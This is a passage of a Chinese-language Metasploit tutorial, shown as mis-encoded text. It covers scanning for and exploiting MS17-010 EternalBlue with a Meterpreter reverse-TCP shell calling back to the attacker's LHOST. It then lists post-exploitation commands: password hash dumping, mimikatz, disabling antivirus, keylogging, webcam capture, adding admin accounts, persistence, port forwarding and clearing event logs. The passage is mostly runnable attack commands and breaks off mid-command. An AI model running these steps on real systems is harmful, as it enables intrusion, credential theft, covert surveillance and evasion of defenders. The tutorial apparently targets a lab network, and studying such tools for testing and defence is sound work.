#è¾“å…¥å‘½ä»¤è¿›å…¥msfæ¸—é€æ¡†æ¶ä¸­ </code></pre><ol><li>æœç´¢ MS17_010 æ¼æ´</li></ol><pre><code class="language-bash">search ms17_010 #åˆ©ç”¨searchå‘½ä»¤ï¼Œæœç´¢æ¼æ´ç›¸å…³åˆ©ç”¨æ¨¡å— </code></pre><h4>åˆ©ç”¨ <code>Auxiliaryè¾…åŠ©æ¢æµ‹æ¨¡å—</code> å¯¹æ¼æ´è¿›è¡Œæ¢æµ‹</h4><p><strong>Auxiliaryè¾…åŠ©æ¢æµ‹æ¨¡å—</strong></p><blockquote><p>è¯¥æ¨¡å—ä¸ä¼šç›´æ¥åœ¨æ”»å‡»æœºå’Œé¶æœºä¹‹é—´å»ºç«‹è®¿é—®ï¼Œå®ƒä»¬åªè´Ÿè´£æ‰§è¡Œæ‰«æï¼Œå—…æ¢ï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰ç›¸å…³åŠŸèƒ½ä»¥è¾…åŠ©æ¸—é€æµ‹è¯•</p></blockquote><ol><li>ä½¿ç”¨ smb_ms17_010 æ¼æ´æ¢æµ‹æ¨¡å—å¯¹ smb_ms17_010 æ¼æ´è¿›è¡Œæ¢æµ‹</li></ol><pre><code class="language-bash">use auxiliary/scanner/smb/smb_ms17_010 </code></pre><ol><li>æŸ¥çœ‹è¿™ä¸ªæ¨¡å—éœ€è¦é…ç½®çš„ä¿¡æ¯</li></ol><pre><code class="language-bash">show options #æŸ¥çœ‹è¿™ä¸ªæ¨¡å—éœ€è¦é…ç½®çš„ä¿¡æ¯ </code></pre><ol><li>è®¾ç½®è¦æ¢æµ‹çš„è¿œç¨‹ç›®æ ‡</li></ol><pre><code class="language-bash">set rhosts 192.168.100.100-192.168.100.190 </code></pre><ol><li>å¯¹ä¸Šé¢è®¾ç½®çš„ ip èŒƒå›´å†…çš„ä¸»æœºè¿›è¡Œæ”»å‡»</li></ol><pre><code class="language-bash">exploit </code></pre><h4>ä½¿ç”¨ <code>Exploitæ¼æ´åˆ©ç”¨æ¨¡å—</code> å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨</h4><ol><li>é€‰æ‹©æ¼æ´æ”»å‡»æ¨¡å—ï¼Œå¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨</li></ol><pre><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue </code></pre><ol><li>æŸ¥çœ‹è¿™ä¸ªæ¼æ´çš„ä¿¡æ¯</li></ol><pre><code class="language-bash">info </code></pre><ol><li>æŸ¥çœ‹å¯æ”»å‡»çš„ç³»ç»Ÿå¹³å°ï¼Œæ˜¾ç¤ºå½“å‰æ”»å‡»æ¨¡å—é’ˆå¯¹å“ªäº›ç‰¹å®šæ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€è¯­è¨€ç‰ˆæœ¬çš„ç³»ç»Ÿ</li></ol><pre><code class="language-bash">show targets </code></pre><h4>Payload æ”»å‡»è½½è·æ¨¡å—</h4><blockquote><p>æ”»å‡»è½½è·æ˜¯æˆ‘ä»¬æœŸæœ›åœ¨ç›®æ ‡ç³»ç»Ÿåœ¨è¢«æ¸—é€æ”»å‡»ä¹‹åå®Œæˆçš„å®é™…æ”»å‡»åŠŸèƒ½çš„ä»£ç <br> æˆåŠŸæ¸—é€ç›®æ ‡åï¼Œç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œä»»æ„å‘½ä»¤</p></blockquote><ol><li>æŸ¥çœ‹æ”»å‡»è½½è·</li></ol><pre><code class="language-bash">show payloads #è¯¥å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰æ¼æ´åˆ©ç”¨æ¨¡å—ä¸‹å¯ç”¨çš„æ‰€æœ‰Payload </code></pre><ol><li>è®¾ç½®æ”»å‡»è½½è·</li></ol><pre><code class="language-bash">set payload windows/x64/meterpreter/reverse_tcp </code></pre><ol><li>æŸ¥çœ‹æ¨¡å—éœ€è¦é…ç½®çš„å‚æ•°</li></ol><pre><code class="language-bash">show options </code></pre><ol><li>è®¾ç½®æ”»å‡»è½½è·å‚æ•°</li></ol><pre><code class="language-bash">set RHOST 192.168.100.158 #è®¾ç½®RHOSTï¼Œä¹Ÿå°±æ˜¯è¦æ”»å‡»ä¸»æœºçš„ip set LHOST 192.168.100.132 #è®¾ç½®LHOSTï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸»æœºçš„ipï¼Œç”¨äºæ¥æ”¶ä»ç›®æ ‡æœºå¼¹å›æ¥çš„shell set lport 6666 #è®¾ç½®lportï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸»æœºçš„ç«¯å£ï¼Œåå¼¹shellåˆ°è¿™ä¸ªç«¯å£ï¼›å¦‚æœæˆ‘ä»¬è¿™é‡Œä¸è®¾ç½®lportçš„è¯ï¼Œé»˜è®¤æ˜¯4444ç«¯å£ç›‘å¬ï¼› </code></pre><ol><li>è¿›è¡Œæ”»å‡»</li></ol><pre><code class="language-bash">exploit </code></pre><hr /><h3>åæ¸—é€é˜¶æ®µ</h3><blockquote><p>è¿è¡Œäº† <code>exploit</code> å‘½ä»¤ä¹‹å<br> æˆ‘ä»¬å¼€å¯äº†ä¸€ä¸ª <code>reverse TCP</code> ç›‘å¬å™¨æ¥ç›‘å¬æœ¬åœ°çš„ <code>6666</code> ç«¯å£<br> å³æˆ‘(æ”»å‡»è€…)çš„æœ¬åœ°ä¸»æœºåœ°å€(LHOST)å’Œç«¯å£å·(LPORT)<br> è¿è¡ŒæˆåŠŸä¹‹åï¼Œæˆ‘ä»¬å°†ä¼šçœ‹åˆ°å‘½ä»¤æç¤ºç¬¦ <code>meterpreter &gt;</code> å‡ºç°</p></blockquote><p>Meterpreter çš„å‘½ä»¤ç”¨æ³•:</p><pre><code class="language-bash">========================================== æ ¸å¿ƒå‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ ? å¸®åŠ©èœå• background æŠŠå½“å‰ä¼šè¯æŒ‚åˆ°åå°è¿è¡Œ bg backgroundå‘½ä»¤çš„åˆ«å bgkill æ€æ­»åå°meterpreter è„šæœ¬ bglist åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬ bgrun æ‰§è¡Œä¸€ä¸ªmeterpreterè„šæœ¬ä½œä¸ºåå°çº¿ç¨‹ channel æ˜¾ç¤ºä¿¡æ¯æˆ–æ§åˆ¶æ´»åŠ¨é¢‘é“ close å…³é—­ä¸€ä¸ªé¢‘é“ detach åˆ†ç¦»Meterpreterä¼šè¯ï¼ˆç”¨äº http/httpsï¼‰ disable_unicode_encoding ç¦ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç  enable_unicode_encoding å¯ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç  exit ç»ˆæ­¢ Meterpreter ä¼šè¯ get_timeouts è·å–å½“å‰ä¼šè¯è¶…æ—¶å€¼ guid è·å–ä¼šè¯ GUID help å¸®åŠ©èœå• info æ˜¾ç¤ºæœ‰å…³ Post æ¨¡å—çš„ä¿¡æ¯ irb åœ¨å½“å‰ä¼šè¯ä¸­æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ Ruby shell load åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ª Meterpreter æ‰©å±• machine_id è·å–è¿æ¥åˆ°ä¼šè¯çš„æœºå™¨çš„ MSF ID migrate å°†æœåŠ¡å™¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ pivot ç®¡ç†æ¢è½´ä¾¦å¬å™¨ pry åœ¨å½“å‰ä¼šè¯ä¸Šæ‰“å¼€ Pry è°ƒè¯•å™¨ quit ç»ˆæ­¢ Meterpreter ä¼šè¯ read ä»é€šé“è¯»å–æ•°æ® resource è¿è¡Œå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ run æ‰§è¡Œä¸€ä¸ª Meterpreter è„šæœ¬æˆ– Post æ¨¡å— secure ï¼ˆé‡æ–°ï¼‰åå•†ä¼šè¯ä¸Šçš„ TLV æ•°æ®åŒ…åŠ å¯† sessions å¿«é€Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¼šè¯ set_timeouts è®¾ç½®å½“å‰ä¼šè¯è¶…æ—¶å€¼ sleep å¼ºåˆ¶ Meterpreter å®‰é™ï¼Œç„¶åé‡æ–°å»ºç«‹ä¼šè¯ ssl_verify ä¿®æ”¹ SSL è¯ä¹¦éªŒè¯è®¾ç½® transport ç®¡ç†è¿è¾“æœºåˆ¶ use ä¸æ¨èä½¿ç”¨çš„loadå‘½ä»¤åˆ«å uuid è·å–å½“å‰ä¼šè¯çš„ UUID write å°†æ•°æ®å†™å…¥é€šé“ ========================================== Stdapiï¼šæ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ cat å°†æ–‡ä»¶å†…å®¹è¯»åˆ°å±å¹•ä¸Š cd åˆ‡æ¢ç›®å½• checksum æ£€ç´¢æ–‡ä»¶çš„æ ¡éªŒå’Œ cp å°†æºå¤åˆ¶åˆ°ç›®æ ‡ del åˆ é™¤æŒ‡å®šæ–‡ä»¶ dir åˆ—å‡ºæ–‡ä»¶ï¼ˆls çš„åˆ«åï¼‰ download ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½• edit ç¼–è¾‘æ–‡ä»¶ getlwd æ‰“å°æœ¬åœ°å·¥ä½œç›®å½• getwd æ‰“å°å·¥ä½œç›®å½• lcd æ›´æ”¹æœ¬åœ°å·¥ä½œç›®å½• lls åˆ—å‡ºæœ¬åœ°æ–‡ä»¶ lpwd æ‰“å°æœ¬åœ°å·¥ä½œç›®å½• ls åˆ—å‡ºæ–‡ä»¶ mkdir åˆ¶ä½œç›®å½• mv å°†æºç§»åŠ¨åˆ°ç›®æ ‡ pwd æ‰“å°å·¥ä½œç›®å½• rm åˆ é™¤æŒ‡å®šæ–‡ä»¶ rmdir åˆ é™¤ç›®å½• search æœç´¢æ–‡ä»¶ show_mount åˆ—å‡ºæ‰€æœ‰æŒ‚è½½ç‚¹/é€»è¾‘é©±åŠ¨å™¨ upload ä¸Šä¼ æ–‡ä»¶æˆ–ç›®å½• ========================================== Stdapiï¼šç½‘ç»œå‘½ä»¤ ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ arp æ˜¾ç¤ºä¸»æœº ARP ç¼“å­˜ getproxy æ˜¾ç¤ºå½“å‰ä»£ç†é…ç½® ifconfig æ˜¾ç¤ºç•Œé¢ ipconfig æ˜¾ç¤ºæ¥å£ netstat æ˜¾ç¤ºç½‘ç»œè¿æ¥ portfwd å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡ resolve è§£æç›®æ ‡ä¸Šçš„ä¸€ç»„ä¸»æœºå route æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨ ========================================== Stdapiï¼šç³»ç»Ÿå‘½ä»¤ ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ clearev æ¸…é™¤äº‹ä»¶æ—¥å¿— drop_token æ”¾å¼ƒä»»ä½•æ´»åŠ¨çš„æ¨¡æ‹Ÿä»¤ç‰Œã€‚ execute æ‰§è¡Œå‘½ä»¤ getenv è·å–ä¸€ä¸ªæˆ–å¤šä¸ªç¯å¢ƒå˜é‡å€¼ getpid è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦ getprivs å°è¯•å¯ç”¨å½“å‰è¿›ç¨‹å¯ç”¨çš„æ‰€æœ‰æƒé™ getid è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·çš„ SID getuid è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ· kill ç»ˆæ­¢è¿›ç¨‹ localtime æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´ pgrep æŒ‰åç§°è¿‡æ»¤è¿›ç¨‹ pkill æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹ ps åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ reboot é‡å¯è¿œç¨‹è®¡ç®—æœº reg ä¿®æ”¹è¿œç¨‹æ³¨å†Œè¡¨å¹¶ä¸ä¹‹äº¤äº’ rev2self åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨ RevertToSelf() shell æ”¾å…¥ç³»ç»Ÿå‘½ä»¤ shell shutdown å…³é—­è¿œç¨‹è®¡ç®—æœº steal_token å°è¯•ä»ç›®æ ‡è¿›ç¨‹çªƒå–æ¨¡æ‹Ÿä»¤ç‰Œ suspend æš‚åœæˆ–æ¢å¤è¿›ç¨‹åˆ—è¡¨ sysinfo è·å–æœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ OS ========================================== Stdapiï¼šç”¨æˆ·ç•Œé¢å‘½ä»¤ ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ enumdesktops åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®çš„æ¡Œé¢å’Œçª—å£ç«™ getdesktop è·å–å½“å‰çš„meterpreteræ¡Œé¢ idletime è¿”å›è¿œç¨‹ç”¨æˆ·ç©ºé—²çš„ç§’æ•° keyboard_send å‘é€å‡»é”® keyevent å‘é€æŒ‰é”®äº‹ä»¶ keyscan_dump è½¬å‚¨å‡»é”®ç¼“å†²åŒº keyscan_start å¼€å§‹æ•è·å‡»é”® keyscan_stop åœæ­¢æ•è·å‡»é”® mouse å‘é€é¼ æ ‡äº‹ä»¶ screenshare å®æ—¶è§‚çœ‹è¿œç¨‹ç”¨æˆ·æ¡Œé¢ screenshot æŠ“å–äº¤äº’å¼æ¡Œé¢çš„æˆªå›¾ setdesktop æ›´æ”¹meterpreterså½“å‰æ¡Œé¢ uictl æ§åˆ¶ä¸€äº›ç”¨æˆ·ç•Œé¢ç»„ä»¶ ========================================== Stdapiï¼šç½‘ç»œæ‘„åƒå¤´å‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ record_mic ä»é»˜è®¤éº¦å…‹é£å½•åˆ¶éŸ³é¢‘ X ç§’ webcam_chat å¼€å§‹è§†é¢‘èŠå¤© webcam_list åˆ—å‡ºç½‘ç»œæ‘„åƒå¤´ webcam_snap ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ‹æ‘„å¿«ç…§ webcam_stream ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ’­æ”¾è§†é¢‘æµ ========================================== Stdapiï¼šéŸ³é¢‘è¾“å‡ºå‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ play åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ’­æ”¾æ³¢å½¢éŸ³é¢‘æ–‡ä»¶ (.wav) ========================================== Privï¼šæƒé™æå‡å‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ getsystem å°è¯•å°†æ‚¨çš„æƒé™æå‡åˆ°æœ¬åœ°ç³»ç»Ÿçš„æƒé™ã€‚ ========================================== Privï¼šå¯†ç æ•°æ®åº“å‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ hashdump è½¬å‚¨ SAM æ•°æ®åº“çš„å†…å®¹ ========================================== Privï¼šTimestomp å‘½ä»¤ï¼š ========================================== å‘½ä»¤ è¯´æ˜ ------- ------------ timestomp æ“ä½œæ–‡ä»¶ MACE å±æ€§ </code></pre><p>è¾“å…¥ <code>shell</code> å³å¯åˆ‡æ¢åˆ°ç›®æ ‡ä¸»æœºçš„ <code>windows cmd_shell</code> é‡Œé¢</p><pre><code class="language-bash">shell #è·å–ç›®æ ‡ä¸»æœºçš„cmd_shellæƒé™ chcp 65001 #è¿™é‡Œä¸ºäº†é¿å…ç›®æ ‡ä¸»æœºcmd_shellå­—ç¬¦ä¹±ç ï¼Œè®¾ç½®ç›®æ ‡ä¸»æœºå‘½ä»¤è¡Œçš„å­—ç¬¦ç¼–ç ï¼Œ65001æ˜¯UTF-8 </code></pre><p>è¦æƒ³ä»ç›®æ ‡ä¸»æœº <code>shell</code> é€€å‡ºåˆ° <code>meterpreter</code> ï¼Œåªéœ€è¾“å…¥ï¼š<code>exit</code></p><p>ä» <code>meterpreter</code> é€€å‡ºåˆ° <code>MSFæ¡†æ¶</code></p><pre><code class="language-bash">background #æŠŠæˆ‘ä»¬è·å¾—çš„meterpreterä¼šè¯æŒ‚è½½åˆ°åå°è¿è¡Œ </code></pre><p>æŸ¥çœ‹å‰é¢è·å¾—çš„ meterpreter_shell ä¼šè¯ï¼Œæœ€å‰é¢çš„æ•°å­—æ˜¯ä¼šè¯çš„ id</p><pre><code class="language-bash">sessions -l #æŸ¥çœ‹è·å¾—çš„meterpreter_shellä¼šè¯åˆ—è¡¨ </code></pre><p>è¾“å…¥ sessions [id å·] å³å¯è¿›å…¥ç›¸åº”çš„ meterpreter_shell ä¸­</p><pre><code class="language-bash">sessions 1 </code></pre><p>è¾“å…¥ <code>shell</code> å³å¯è¿›å…¥ <code>cmd</code> ç±»å‹çš„æ§åˆ¶<br> å†è¾“å…¥ <code>powershell</code> ï¼Œå³å¯è¿›å…¥ <code>powershell</code> ç±»å‹çš„æ§åˆ¶å°</p><pre><code class="language-bash">sysinfo #æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿä¿¡æ¯ run scraper #æŸ¥çœ‹ç›®æ ‡ä¸»æœºè¯¦ç»†ä¿¡æ¯ run hashdump #å¯¼å‡ºå¯†ç çš„å“ˆå¸Œ load kiwi #åŠ è½½mimikatz ps #æŸ¥çœ‹ç›®æ ‡ä¸»æœºè¿›ç¨‹ä¿¡æ¯ pwd #æŸ¥çœ‹ç›®æ ‡å½“å‰ç›®å½•(windows) getlwd #æŸ¥çœ‹ç›®æ ‡å½“å‰ç›®å½•(Linux) search -f *.jsp -d e:\ #æœç´¢Eç›˜ä¸­æ‰€æœ‰ä»¥.jspä¸ºåç¼€çš„æ–‡ä»¶ download e:\test.txt /root #å°†ç›®æ ‡æœºçš„e:\test.txtæ–‡ä»¶ä¸‹è½½åˆ°/rootç›®å½•ä¸‹ upload /root/test.txt d:\test #å°†/root/test.txtä¸Šä¼ åˆ°ç›®æ ‡æœºçš„ d:\test\ ç›®å½•ä¸‹ getpid #æŸ¥çœ‹å½“å‰Meterpreter Shellçš„è¿›ç¨‹PID migrate 1384 #å°†å½“å‰Meterpreter Shellçš„è¿›ç¨‹è¿ç§»åˆ°PIDä¸º1384çš„è¿›ç¨‹ä¸Š idletime #æŸ¥çœ‹ä¸»æœºè¿è¡Œæ—¶é—´ getuid #æŸ¥çœ‹è·å–çš„å½“å‰æƒé™ getsystem #ææƒ,è·å¾—çš„å½“å‰ç”¨æˆ·æ˜¯administratoræ‰èƒ½æˆåŠŸ run killav #å…³é—­æ€æ¯’è½¯ä»¶ screenshot #æˆªå›¾ webcam_list #æŸ¥çœ‹ç›®æ ‡ä¸»æœºçš„æ‘„åƒå¤´ webcam_snap #æ‹ç…§ webcam_stream #å¼€è§†é¢‘ execute å‚æ•° -f å¯æ‰§è¡Œæ–‡ä»¶ #æ‰§è¡Œå¯æ‰§è¡Œç¨‹åº run getgui -u test1 -p Abc123456 #åˆ›å»ºtest1ç”¨æˆ·ï¼Œå¯†ç ä¸ºAbc123456 run getgui -e #å¼€å¯è¿œç¨‹æ¡Œé¢ keyscan_start #å¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ keyscan_dump #æ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯ keyscan_stop #åœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½ uictl disable keyboard #ç¦æ­¢ç›®æ ‡ä½¿ç”¨é”®ç›˜ uictl enable keyboard #å…è®¸ç›®æ ‡ä½¿ç”¨é”®ç›˜ uictl disable mouse #ç¦æ­¢ç›®æ ‡ä½¿ç”¨é¼ æ ‡ uictl enable mouse #å…è®¸ç›®æ ‡ä½¿ç”¨é¼ æ ‡ load #ä½¿ç”¨æ‰©å±•åº“ run #ä½¿ç”¨æ‰©å±•åº“ run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888 #ä¼šè‡ªåŠ¨è¿æ¥192.168.100.132çš„8888ç«¯å£ï¼Œç¼ºç‚¹æ˜¯å®¹æ˜“è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€ portfwd add -l 9999 -r 192.168.100.158 -p 3389 #å°†192.168.11.13çš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„9999ç«¯å£ä¸Šï¼Œè¿™é‡Œçš„192.168.100.158æ˜¯è·å–æƒé™çš„ä¸»æœºçš„ipåœ°å€ clearev #æ¸…é™¤æ—¥å¿— </code></pre><h4>Post åæ¸—é€æ¨¡å—</h4><blockquote><p>è¯¥æ¨¡å—ä¸»è¦ç”¨äºåœ¨å–å¾—ç›®æ ‡ä¸»æœºç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒå<br> è¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œ</p></blockquote><pre><code class="language-bash">run post/windows/manage/migrate #è‡ªåŠ¨è¿›ç¨‹è¿ç§» run post/windows/gather/checkvm #æŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š run post/windows/manage/killav #å…³é—­æ€æ¯’è½¯ä»¶ run post/windows/manage/enable_rdp #å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡ run post/windows/manage/autoroute #æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ run post/windows/gather/enum_logged_on_users #åˆ—ä¸¾å½“å‰ç™»å½•çš„ç”¨æˆ· run post/windows/gather/enum_applications #åˆ—ä¸¾åº”ç”¨ç¨‹åº run post/windows/gather/credentials/windows_autologin #æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç  run post/windows/gather/smart_hashdump #dumpå‡ºæ‰€æœ‰ç”¨æˆ·çš„hash </code></pre><p>å¯è¾“å…¥ <code>sysinfo</code> æŸ¥çœ‹ç›®æ ‡ä¸»æœºçš„ä¿¡æ¯</p><h4>æŸ¥çœ‹ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š</h4><p>æŸ¥çœ‹ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Šï¼Œå¯ä»¥çœ‹å‡ºä¸»æœºæ˜¯åœ¨è™šæ‹Ÿæœºç¯å¢ƒ</p><pre><code class="language-bash">run post/windows/gather/checkvm </code></pre><h4>å…³é—­æ€æ¯’è½¯ä»¶</h4><p>æ‹¿åˆ°ç›®æ ‡ä¸»æœºçš„ shell åç¬¬ä¸€ä»¶äº‹å°±æ˜¯å…³é—­æ‰ç›®æ ‡ä¸»æœºçš„æ€æ¯’è½¯ä»¶</p><pre><code class="language-bash">run killav </code></pre><h4>è·å–ç›®æ ‡ä¸»æœºçš„è¯¦ç»†ä¿¡æ¯</h4><p>ä½¿ç”¨å‘½ä»¤</p><pre><code class="language-bash">run scraper </code></pre><p>å®ƒå°†ç›®æ ‡æœºå™¨ä¸Šçš„å¸¸è§ä¿¡æ¯æ”¶é›†èµ·æ¥ç„¶åä¸‹è½½ä¿å­˜åœ¨æœ¬åœ°</p><h4>è®¿é—®æ–‡ä»¶ç³»ç»Ÿ</h4><p>Meterpreter æ”¯æŒéå¸¸å¤šçš„æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ (åŸºæœ¬è·Ÿ Linux ç³»ç»Ÿå‘½ä»¤ç±»ä¼¼)</p><pre><code class="language-bash">pwd #æŸ¥çœ‹å½“å‰ç›®å½• cd #åˆ‡æ¢ç›®æ ‡ç›®å½•ï¼› cat #è¯»å–æ–‡ä»¶å†…å®¹ï¼› rm #åˆ é™¤æ–‡ä»¶ï¼› edit #ä½¿ç”¨vimç¼–è¾‘æ–‡ä»¶ ls #è·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼› mkdir #æ–°å»ºç›®å½•ï¼› rmdir #åˆ é™¤ç›®å½•ï¼› </code></pre><h4>ä¸Šä¼  / ä¸‹è½½æ–‡ä»¶</h4><h5>ä¸‹è½½æ–‡ä»¶</h5><pre><code class="language-bash">download file #å‘½ä»¤å¯ä»¥å¸®åŠ©æˆ‘ä»¬ä»ç›®æ ‡ç³»ç»Ÿä¸­ä¸‹è½½æ–‡ä»¶ </code></pre><h5>ä¸Šä¼ æ–‡ä»¶</h5><pre><code class="language-bash">upload file #å‘½ä»¤åˆ™èƒ½å¤Ÿå‘ç›®æ ‡ç³»ç»Ÿä¸Šä¼ æ–‡ä»¶ã€‚ </code></pre><h4>æƒé™æå‡</h4><p>æœ‰çš„æ—¶å€™ï¼Œä½ å¯èƒ½ä¼šå‘ç°è‡ªå·±çš„ <code>Meterpreter</code> ä¼šè¯å—åˆ°äº†ç”¨æˆ·æƒé™çš„é™åˆ¶ï¼Œè€Œè¿™å°†ä¼šä¸¥é‡å½±å“ä½ åœ¨ç›®æ ‡ç³»ç»Ÿä¸­çš„æ´»åŠ¨<br> æ¯”å¦‚è¯´ï¼Œ<code>ä¿®æ”¹æ³¨å†Œè¡¨</code>ã€<code>å®‰è£…åé—¨</code>æˆ–<code>å¯¼å‡ºå¯†ç </code>ç­‰æ´»åŠ¨éƒ½éœ€è¦<code>æå‡ç”¨æˆ·æƒé™</code><br> è€Œ <code>Meterpreter</code> ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ª <code>getsystem</code> å‘½ä»¤<br> å®ƒå¯ä»¥ä½¿ç”¨å¤šç§æŠ€æœ¯åœ¨ç›®æ ‡ç³»ç»Ÿä¸­å®ç°ææƒ</p><pre><code class="language-bash">getuid #å‘½ä»¤å¯ä»¥è·å–å½“å‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ getsystemè¿›è¡Œææƒåï¼Œç”¨æˆ·èº«æä¸º NT AUTHORITY\SYSTEM ï¼Œè¿™ä¸ªä¹Ÿå°±æ˜¯Windowsçš„ç³»ç»Ÿæƒé™ã€‚ getsystem #è‡ªåŠ¨ææƒä¸ºç³»ç»Ÿæƒé™ </code></pre><h4>è·å–ç”¨æˆ·å¯†ç </h4><p><a href="../b034a3f3/" target="_blank" rel="noopener noreferrer">ä½¿ç”¨ MSF æŠ“å–ç”¨æˆ·å¯†ç </a></p><h4>è¿è¡Œç¨‹åº</h4><p>å…ˆæŸ¥çœ‹ç›®æ ‡ä¸»æœºå®‰è£…äº†å“ªäº›åº”ç”¨</p><pre><code class="language-bash">run post/windows/gather/enum_applications #æŸ¥çœ‹ç›®æ ‡ä¸»æœºå®‰è£…äº†å“ªäº›åº”ç”¨ </code></pre><p>åœ¨ <code>meterpreter_shell</code> å‘½ä»¤è¡Œæ‰§è¡Œç›®æ ‡ç³»ç»Ÿä¸­çš„åº”ç”¨ç¨‹åº</p><pre><code class="language-bash">#executeå‘½ä»¤ç”¨æ³•ï¼š execute [å‚æ•°] -f æŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ -fï¼šæŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶ -Hï¼šåˆ›å»ºä¸€ä¸ªéšè—è¿›ç¨‹ -aï¼šä¼ é€’ç»™å‘½ä»¤çš„å‚æ•° -iï¼šè·Ÿè¿›ç¨‹è¿›è¡Œäº¤äº’ -mï¼šä»å†…å­˜ä¸­æ‰§è¡Œ -tï¼šä½¿ç”¨å½“å‰ä¼ªé€ çš„çº¿ç¨‹ä»¤ç‰Œè¿è¡Œè¿›ç¨‹ -sï¼šåœ¨ç»™å®šä¼šè¯ä¸­æ‰§è¡Œè¿›ç¨‹ </code></pre><h4>å±å¹•æˆªå›¾</h4><p>æˆªå›¾ç›®æ ‡ä¸»æœºå±å¹•ï¼Œå›¾ç‰‡ä¿å­˜åˆ° <code>/root/Desktop/</code> ä¸‹</p><pre><code class="language-bash">screenshot #æˆªå›¾ç›®æ ‡ä¸»æœºå±å¹• </code></pre><h4>åˆ›å»ºä¸€ä¸ªæ–°è´¦å·</h4><p>å…ˆæŸ¥çœ‹ç›®æ ‡ä¸»æœºæœ‰å“ªäº›ç”¨æˆ·</p><pre><code class="language-bash">run post/windows/gather/enum_logged_on_users #æŸ¥çœ‹ç›®æ ‡ä¸»æœºæœ‰ç”¨æˆ· </code></pre><p>åœ¨ç›®æ ‡ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·è´¦å·çš„æ–¹æ³•ä¸€</p><pre><code class="language-bash">run getgui -u ç”¨æˆ· -p å¯†ç  -u: æŒ‡å®šç”¨æˆ· -p: æŒ‡å®šå¯†ç  </code></pre><blockquote><p>è¿™ä¸ªå‘½ä»¤ä¼šåˆ›å»ºç”¨æˆ·<br> å¹¶æŠŠä»–æ·»åŠ åˆ° <code>Administrators</code> ç»„ä¸­<br> è¿™æ ·è¯¥ç”¨æˆ·å°±æ‹¥æœ‰è¿œç¨‹æ¡Œé¢çš„æƒé™äº†</p></blockquote><p>åœ¨ç›®æ ‡ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·è´¦å·çš„æ–¹æ³•äºŒ</p><pre><code class="language-bash">enable_rdpè„šæœ¬: run post/windows/manage/enable_rdp USERNAME=test2 